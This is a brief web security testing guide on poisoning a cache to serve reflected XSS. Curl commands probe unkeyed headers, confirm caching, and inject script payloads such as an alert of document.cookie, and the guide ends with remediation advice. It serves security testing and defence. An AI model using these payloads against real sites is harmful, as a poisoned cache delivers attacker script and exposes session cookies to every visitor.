# Poison to Reflected XSS via Cache

## Summary
When an unkeyed header is reflected in the response and the cache stores the result, an attacker can poison the cache with an XSS payload. Every user who visits the target URL receives the malicious cached response.

## Detection

### Step 1: Find Reflected Unkeyed Input
Test headers that may be reflected in the response:

```bash
# Test X-Forwarded-Host reflection
curl -s "https://target.com/" -H "X-Forwarded-Host: attacker.com" | grep "attacker.com"

# Test X-Forwarded-For reflection
curl -s "https://target.com/" -H "X-Forwarded-For: 127.0.0.1" | grep "127.0.0.1"

# Test X-Original-URL reflection
curl -s "https://target.com/" -H "X-Original-Url: /test" | grep "/test"

# Test X-HTTP-Method-Override
curl -s "https://target.com/" -H "X-HTTP-Method-Override: PROPFIND" | grep "PROPFIND"

# Test Referer header
curl -s "https://target.com/" -H "Referer: https://attacker.com/payload" | grep "attacker.com"
```

### Step 2: Confirm Caching of Reflected Value

```bash
# Send with a unique value in the unkeyed header
curl -s "https://target.com/" -H "X-Forwarded-Host: uniq-cache-buster-123.test"

# Send again without the header — if the unique value appears, it was cached
curl -s "https://target.com/"
```

If "uniq-cache-buster-123.test" appears in the second response, the unkeyed input was cached.

### Step 3: Craft the Poisoning Payload
Inject an XSS payload via the unkeyed header:

```bash
# Inject via X-Forwarded-Host
curl -s "https://target.com/" \
  -H "X-Forwarded-Host: \"><script>alert(document.cookie)</script>"

# Inject via X-Forwarded-For
curl -s "https://target.com/" \
  -H "X-Forwarded-For: \"><img src=x onerror=alert(1)>"

# Inject via Referer (if reflected)
curl -s "https://target.com/" \
  -H "Referer: https://xss.com/\"><script>alert(1)</script>"
```

### Step 4: Verify Poison
Visit the target URL in a private browser session without any custom headers:

```bash
curl -s "https://target.com/"
```

If the injected script executes or appears in the HTML, cache poisoning to XSS is confirmed.

## Remediation
- Never reflect unkeyed headers in the response
- Include all reflected inputs in the cache key
- Apply output encoding even for internal headers
- Use a Content Security Policy to mitigate XSS impact
- Set Cache-Control: no-store for any endpoint that reflects request values
